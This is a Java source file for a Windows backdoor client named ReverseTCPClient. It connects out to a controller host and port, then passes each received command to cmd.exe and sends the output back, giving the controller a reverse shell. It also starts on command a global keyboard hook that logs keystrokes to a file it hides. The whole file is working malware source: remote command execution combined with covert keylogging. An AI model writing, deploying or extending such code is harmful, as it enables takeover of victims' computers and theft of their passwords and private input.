package com.company.Backdoor.ReverseTCP;

import com.company.Backdoor.BackdoorConstants;
import com.company.KeyloggerWindows.FileOperation;
import com.company.KeyloggerWindows.Keyboard;
import lc.kra.system.keyboard.GlobalKeyboardHook;

import java.io.*;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.attribute.DosFileAttributes;

public class ReverseTCPClient
{
    private Socket socket;
    private int port;
    private String ip;
    private DataInputStream dis;
    private PrintWriter writer;
    private BufferedReader reader;



    private Thread keylogger;

    public ReverseTCPClient(String ip, int port)
    {
        try
        {
            this.port = port;
            this.ip = ip;
            socket = new Socket(ip, port);
            dis = new DataInputStream(socket.getInputStream());
            writer = new PrintWriter(socket.getOutputStream());
            reader = new BufferedReader(new InputStreamReader(dis));
        } catch (IOException e)
        {
            e.printStackTrace();
        }
    }


    private String response(BufferedReader reader) throws IOException
    {
        String line;
        String str = "";
        while ((line = reader.readLine()) != null)
        {
            if (line.endsWith(BackdoorConstants.END_OF_COMMAND))
                break;
            str += line+"\n";
        }
        return str+"\n"+BackdoorConstants.END_OF_COMMAND;
    }


    private String reverseShell(String command, Process process) throws IOException
    {
        PrintWriter writer = new PrintWriter(process.getOutputStream());
        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));

        writer.println(command);
        writer.println(BackdoorConstants.END_OF_COMMAND);
        writer.flush();

        return response(reader);
    }



    private Runtime createRunTime()
    {
        return Runtime.getRuntime();
    }

    private void stopKeylogger()
    {

        Keyboard.run = false;

    }

    private void startKeylogger()
    {
      keylogger = new Thread(new Runnable() {
            @Override
            public void run() {
                GlobalKeyboardHook keyboardHook = new GlobalKeyboardHook(true);

                try {
                    Keyboard.run = true;
                    new File(Keyboard.WINDOWS_FILE_PATH).createNewFile();
                    Path p = Paths.get(Keyboard.WINDOWS_FILE_PATH);
                    DosFileAttributes dos = Files.readAttributes(p, DosFileAttributes.class);
                    Files.setAttribute(p, "dos:hidden", true);
                    Keyboard keyboard = new Keyboard(new FileOperation(),Keyboard.WINDOWS_FILE_PATH);
                    keyboardHook.addKeyListener(keyboard);

                    while(Keyboard.run)
                    {
                        if (keylogger.isAlive())
                            keylogger.sleep(128);
                    }
                    keylogger.stop();

                }
                catch (IOException | InterruptedException e)
                {
                    e.printStackTrace();
                } finally {
                    keyboardHook.shutdownHook();
                }
            }
        });
      keylogger.start();


    }


    public void run()
    {
        try
        {
            Runtime runtime = createRunTime();
            Process process = runtime.exec("C:\\Windows\\System32\\cmd.exe");

            while (true)
            {
                String command = reader.readLine();

                if (command.equals("exit"))
                    break;
                if (command.equals("start_keylogger"))
                    startKeylogger();
                if (command.equals("stop_keylogger"))
                    stopKeylogger();
                else
                {
                    String response = reverseShell(command,process);
                    writer.println(response);
                    writer.flush();
                    runtime = createRunTime();
                }
            }
            System.out.println("Connection closed!");
            socket.close();
        }
        catch (IOException e)
        {
            e.printStackTrace();
        }
    }

    public static void main(String[] args)
    {
        ReverseTCPClient client = new ReverseTCPClient("localhost",2020);
        client.run();
    }
}
